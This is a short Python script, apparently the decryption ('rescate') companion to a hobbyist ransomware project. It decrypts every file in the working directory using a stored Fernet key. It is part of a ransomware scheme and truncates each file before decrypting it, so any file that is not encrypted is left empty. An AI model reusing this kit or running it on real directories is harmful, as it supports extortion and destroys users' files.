#!/usr/bin/python3

import os
from cryptography.fernet import Fernet

# Eto se va descontrolaaaaaaaaaaaaa

NOMBRE_LLAVE = "regalico.txt"
NOMBRE_FICHERO = "ramsomware.py"
NOMBRE_RESCATE = "rescate.py"


def free_files(fichericos, key):
	for ficherico in fichericos:
		with open(ficherico, "rb") as abierto:
			content = abierto.read()
		with open (ficherico, "wb") as abierto:
			content_encrypted = Fernet(key).decrypt(content)
			abierto.write(content_encrypted)

def get_key():
	with open(NOMBRE_LLAVE, "rb") as file:
		key = file.read()
		return key


def fuiste_troliado():

	files = []
	for file in os.listdir():
		if file == "ramsomware.py" or file == "regalico.txt" or file == "rescate.py":
			continue
		files.append(file)


	key = get_key()
	free_files(files, key)



if __name__ == "__main__":
	fuiste_troliado()
